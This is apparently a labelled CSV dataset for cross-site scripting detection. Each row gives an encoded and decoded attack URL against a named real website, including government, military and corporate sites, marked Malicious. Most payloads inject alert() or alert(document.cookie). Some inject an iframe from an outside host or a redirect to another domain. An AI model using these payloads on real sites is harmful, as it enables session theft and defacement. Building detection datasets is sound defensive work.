Payloads,Class,decoded,executed,parser_changed
http://www.rgz.sr.gov.yu/docf/default.asp?login=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ft<br>extarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3<br>balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3c<br>div%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520<br>rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscri<br>pt%3e%3cplaintext%3e%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%<br>28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e<br>%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%25<br>20%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3eka<br>ksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;passwor<br>d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_he<br>re%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3<br>chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size<br>%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520h<br>ere%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;btlogin=login,Malicious,"http://www.rgz.sr.gov.yu/docf/default.asp?login=""><script>alert(1)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(1)</script>""</html><html><script>alert(10111)</script><div align=center> <font size=4><textarea name=1 cols=100000 rows=10000 id=1>kaksii was here</textarea></font></div><noscript><plaintext>""><script>alert(1)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(1)</script>""</html><html><script>alert(10111)</script><div align=center> <font size=4><textarea name=1 cols=100000 rows=10000 id=1>kaksii was here</textarea></font></div><noscript><plaintext>&password=""><script>alert(1)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(1)</script>""</html><html><script>alert(10111)</script><div align=center> <font size=4><textarea name=1 cols=100000 rows=10000 id=1>kaksii was here</textarea></font></div><noscript><plaintext>&btlogin=login",True,True
http://www.gesecurity.com/portal/site/gesecurity/template.page/menuitem.5618f8037e6d3a0c8e6e9510c403<br>0730/?javax.portlet.tpst=2080500d1d974fba0c39142cc4030730&amp;javax.portlet.prp_2080500d1d974fba0c39142c<br>c4030730_viewid=my_portal_view&amp;javax.portlet.begcachetok=token&amp;javax.portlet.endcachetok=token&amp;withi<br>nquery1=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e,Malicious,"http://www.gesecurity.com/portal/site/gesecurity/template.page/menuitem.5618f8037e6d3a0c8e6e9510c4030730/?javax.portlet.tpst=2080500d1d974fba0c39142cc4030730&javax.portlet.prp_2080500d1d974fba0c39142cc4030730_viewid=my_portal_view&javax.portlet.begcachetok=token&javax.portlet.endcachetok=token&withinquery1=""><script>alert('xss')</script>",True,True
http://www.pcworld.co.uk/martprd/editorial/christmas-sale?camp_id=&quot;;&lt;/script&gt;&lt;script&gt;alert(&quot;by+panze<br>rturk+xss&quot;);&lt;/script&gt;,Malicious,"http://www.pcworld.co.uk/martprd/editorial/christmas-sale?camp_id="";</script><script>alert(""by panzerturk xss"");</script>",True,True
http://www.michelin.ro/ro/front/search.jsp?query=cautare%2e%2e%2e&amp;lang=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xs<br>s%20by%20turkpower%20-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.michelin.ro/ro/front/search.jsp?query=cautare...&lang=>""><script 
>alert('xss by turkpower - canim turkiyem');</script><h1>xss by turkpower</h1></marquee>",True,True
http://www.wir-sind-bonn.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.wir-sind-bonn.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://lenta.ru/search?search=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://lenta.ru/search?search=""><script>alert(document.cookie)</script>",True,True
http://pasqua.ath.cx/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://pasqua.ath.cx/phpinfo.php?a[]=""><script>alert(document.cookie)</script>",True,True
"http://finance.indiamart.com/cgi-bin/stocksearch.cgi?which_exchange=bse&option=company&company_name=<script>alert(""xss3d by sid3_effects"")<%2fscript>&submit1=go",Malicious,"http://finance.indiamart.com/cgi-bin/stocksearch.cgi?which_exchange=bse&option=company&company_name=<script>alert(""xss3d by sid3_effects"")</script>&submit1=go",True,True
http://www.hostile-city.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.hostile-city.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://www.mercadolivre.pt/portugal/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious,"http://www.mercadolivre.pt/portugal/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=�&as_pcia_id=>""><script>alert('xss');</script>",True,True
http://www.galileocomputing.de/buchscanner/ergebnis?galileosession=&amp;suchstring=%3c%22%3c%3cscript%3e<br>alert(%22xssed%20by%20kingofchaos%22)%3c/script%3e,Malicious,"http://www.galileocomputing.de/buchscanner/ergebnis?galileosession=&suchstring=<""<<script>alert(""xssed by kingofchaos"")</script>",True,True
http://www.senalshop.com/main/search_results.asp?words=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.senalshop.com/main/search_results.asp?words=""><script>alert(""backdoor"")</script>",True,True
http://www.frontnational.com/jdb_detail.php?id=55&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.frontnational.com/jdb_detail.php?id=55""><script>alert(document.cookie)</script>",True,True
https://knowledge.verisign.com/support/registrar/index?page=nosidebarlogin&amp;returnqs=&quot;&gt;&lt;script&gt;alert(<br>/xss/)&lt;/script&gt;,Malicious,"https://knowledge.verisign.com/support/registrar/index?page=nosidebarlogin&returnqs=""><script>alert(/xss/)</script>",True,True
http://income.com.sg/search/advsearch.asp?target=ptd&amp;rc=10&amp;drpcategory=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/scr<br>ipt&gt;,Malicious,"http://income.com.sg/search/advsearch.asp?target=ptd&rc=10&drpcategory=""><script>alert(""cyber"")</script>",True,True
http://www.radioya.net/cgi-bin/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%6<br>1%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33<br>%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%<br>2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.radioya.net/cgi-bin/a-news.cgi?date=2007.11.30&cal="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://ame.cami.jccbi.gov/search.asp?search=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious,"http://ame.cami.jccbi.gov/search.asp?search=""><script>alert('by encore')</script>",True,True
http://dosyam.net/index.php?lang=tur&amp;view=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://dosyam.net/index.php?lang=tur&view=""><script>alert(document.cookie)</script>",True,True
http://www.thyssenkruppelevator.com/search.asp?query=dsfg%22%3e%3cscript%3ealert(1337)%3c/script%3e&amp;<br>submit=submit,Malicious,"http://www.thyssenkruppelevator.com/search.asp?query=dsfg""><script>alert(1337)</script>&submit=submit",True,True
http://www.cmsnx.com/product.purchase.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.cmsnx.com/product.purchase.php?id=""><script>alert(document.cookie)</script>",True,True
http://www.ballonfahrt.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.ballonfahrt.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.lyhmwz.cn/hm/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;submit=%cb%d1%cb%f7,Malicious,"http://www.lyhmwz.cn/hm/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=<script>alert(""xss"")</script>&submit=����",True,True
http://www.gameinw.com/pageth.php?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,http://www.gameinw.com/pageth.php?keyword=<script>alert(document.cookie);</script>,True,True
http://isohunt.com/torrents.php?ihq=&quot;&gt;&lt;script&gt;alert('s0m.ph');&lt;/script&gt;,Malicious,"http://isohunt.com/torrents.php?ihq=""><script>alert('s0m.ph');</script>",True,True
http://www.citybreeze.com/photoalbum/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.citybreeze.com/photoalbum/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://e.www1.xwjp.com/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious,"http://e.www1.xwjp.com/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://www.otoburada.com/flexi/news.php?newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.otoburada.com/flexi/news.php?newsid=""><script>alert(document.cookie)</script>",True,True
http://kayak.about.com/flights?origin=%22%3e%3cscript%3ealert(%22hehe%22)%3c/script%3e,Malicious,"http://kayak.about.com/flights?origin=""><script>alert(""hehe"")</script>",True,True
http://www.forumup.us/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.forumup.us/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://yufind.library.yale.edu/yufind/search/results?lookfor=%3cscript%3ealert%28%27**xssed**+by+cir<br>0%27%29%3b%3c%2fscript%3e&amp;type=allfields&amp;submit=find,Malicious,http://yufind.library.yale.edu/yufind/search/results?lookfor=<script>alert('**xssed** by cir0');</script>&type=allfields&submit=find,True,True
"http://www.cbn.com/media/player/search.aspx?t=k&search='><script>alert(""by%20hac4ker"");</script>",Malicious,"http://www.cbn.com/media/player/search.aspx?t=k&search='><script>alert(""by hac4ker"");</script>",True,True
http://www.imagens.de/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;<br>&lt;/marquee&gt;,Malicious,"http://www.imagens.de/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.dswd.gov.ph/faqdetails.php?id=-%20}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sourc<br>e));%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.dswd.gov.ph/faqdetails.php?id=- }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://www.tniad.mil.id/1search.php?cari=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3<br>e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.tniad.mil.id/1search.php?cari='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.jorts.com/index.cfm?go=photos.results&amp;search=%3cscript%3ealert(document.cookie)%3c/script<br>%3e&amp;submit.x=12&amp;submit.y=11,Malicious,http://www.jorts.com/index.cfm?go=photos.results&search=<script>alert(document.cookie)</script>&submit.x=12&submit.y=11,True,True
http://webimenik.net.hr/search_rd.jsp?ct=imenik&amp;q=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2<br>ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29<br>%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%<br>3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%25<br>20rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnosc<br>ript%3e%3cplaintext%3e&amp;x=24&amp;y=8&amp;st=simple&amp;fh=1,Malicious,"http://webimenik.net.hr/search_rd.jsp?ct=imenik&q=""><script>alert(1)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(1)</script>""</html><html><script>alert(10111)</script><div align=center> <font size=4><textarea name=1 cols=100000 rows=10000 id=1>kaksii was here</textarea></font></div><noscript><plaintext>&x=24&y=8&st=simple&fh=1",True,True
http://www.bagongshan.gov.cn/dzbwg/bbs/login.asp?url=%22%3e%3cscript%3ealert(1)%3c/script%3e%3ca%20n<br>ame=%22,Malicious,"http://www.bagongshan.gov.cn/dzbwg/bbs/login.asp?url=""><script>alert(1)</script><a name=""",True,True
http://www.erosetler.com/cin-yagi-china-oel/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.<br>cookie%22)%3c/script%3e,Malicious,"http://www.erosetler.com/cin-yagi-china-oel/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://www.fitel.gob.pe/contenido.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious,"http://www.fitel.gob.pe/contenido.php?id=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://usenet.mail2web.com/cgi-bin/dnewsweb.exe?cmd=article&amp;group=%22%3e%3cscript%3ealert(/xss%20by%<br>20fugitif/)%3c/script%3e,Malicious,"http://usenet.mail2web.com/cgi-bin/dnewsweb.exe?cmd=article&group=""><script>alert(/xss by fugitif/)</script>",True,True
http://curtarney.bmt.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=32<br>01&amp;hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3e<br>alert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20her<br>e%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/fo<br>rocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss<br>.html%20%3c,Malicious,"http://curtarney.bmt.mlxchange.com/middletier/errorpage.asp?fatal=0&severity=3&category=3&eventid=3201&hideresetbtn=0&hidedetails=1&msg=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://www.hilfe-fuer-frauen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.hilfe-fuer-frauen.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.usmint.gov/kids/teachers/lessonplans/50sq/download.cfm?grade=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious,"http://www.usmint.gov/kids/teachers/lessonplans/50sq/download.cfm?grade=""><script>alert(""maxwel"")</script>",True,True
http://www.pizzahut.de/de/newsletter/index?email=%22%3e%3cscript%3ealert%281%29%3b%3c%2fscript%3egee<br>k%40nerd.com&amp;anmelden.x=5&amp;anmelden.y=5,Malicious,"http://www.pizzahut.de/de/newsletter/index?email=""><script>alert(1);</script>geek@nerd.com&anmelden.x=5&anmelden.y=5",True,True
https://e-loket.onderbanken.nl/index.php?simaction=content&amp;pagid=45&amp;mediumid=2&amp;actie=zoeken&amp;zoekmedi<br>um=2&amp;zoekuitgebreid=&amp;trefwoord=%3e%22%3e%3cscript%3ealert%28%22hacked+by+poltergeisth4cker%21+2009+f<br>rom+netherlands%22%29%3c%2fscript%3e%3e,Malicious,"https://e-loket.onderbanken.nl/index.php?simaction=content&pagid=45&mediumid=2&actie=zoeken&zoekmedium=2&zoekuitgebreid=&trefwoord=>""><script>alert(""hacked by poltergeisth4cker! 2009 from netherlands"")</script>>",True,True
"http://drug-clomid.com/search.php?search_text=/""><script>alert(1)</script>",Malicious,"http://drug-clomid.com/search.php?search_text=/""><script>alert(1)</script>",True,True
http://searchcgi.apple.com/cgi-bin/sp/nph-searchpre11.pl?q=foo&amp;output=xml_no_dtd&amp;client=default_fron<br>tend&amp;site=us_only&amp;lr=lang_en&amp;sort=&amp;start=&amp;access=p&amp;oe=utf-8--%3e%3cscript%3ealert('xssed')%3c/script<br>%3e,Malicious,http://searchcgi.apple.com/cgi-bin/sp/nph-searchpre11.pl?q=foo&output=xml_no_dtd&client=default_frontend&site=us_only&lr=lang_en&sort=&start=&access=p&oe=utf-8--><script>alert('xssed')</script>,True,True
http://www.royalsunalliance.com/royalsun/careers/index.jsp?link=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.royalsunalliance.com/royalsun/careers/index.jsp?link=""><script>alert(""maxwel"")</script>",True,True
http://onefm.ro/dj-profile.php?id=%22%3e%3cscript%3ealert(/illuz1on-at-r00tdefaced.net/)%3c/script%3<br>e,Malicious,"http://onefm.ro/dj-profile.php?id=""><script>alert(/illuz1on-at-r00tdefaced.net/)</script>",True,True
http://member1.taobao.com/member/login.jhtml?redirect_url=%3c%22%3c%3cscript%3ealert(document.cookie<br>)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(doc<br>ument.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript<br>%3ealert(document.cookie)%3c/script%3e,Malicious,"http://member1.taobao.com/member/login.jhtml?redirect_url=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script>",True,True
http://www.valleyccc.org/members.php?id=1%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.valleyccc.org/members.php?id=1""><script>alert(document.cookie)</script>",True,True
http://search.deviantart.com/?section=browse&amp;qh=boost%3apopular+age_sigma%3a24h+age_scale%3a5&amp;q=%22%<br>3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27,Malicious,"http://search.deviantart.com/?section=browse&qh=boost:popular age_sigma:24h age_scale:5&q="">'><script>alert(123)</script>""'",True,True
http://www.farmindustria.it/farmindustria/html/publisher_list.asp?title=&lt;script&gt;alert(&quot;scriptorium(t<br>urkey)&quot;)&lt;/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://www.farmindustria.it/farmindustria/html/publisher_list.asp?title=<script>alert(""scriptorium(turkey)"")</script><meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://uni16.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious,"http://uni16.ogame.de/game/redir.php?url=http://<""<<script>alert(document.cookie)</script>",True,True
http://www.evite.com/loginregform?redirect=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www.evite.com/loginregform?redirect=""><script>alert(123)</script>",True,True
http://www.isratrade.net/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.isratrade.net/search_result.php?keyword=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.surscene.com/recherche/recherche.php?agenda=&amp;motcle=%27%22%3e%3c%2ftitle%3e%3cscript%3eal<br>ert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.surscene.com/recherche/recherche.php?agenda=&motcle='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.raggareggae.com/public/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious,"http://www.raggareggae.com/public/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>.com",True,True
http://www.akn.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.akn.com.tr/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
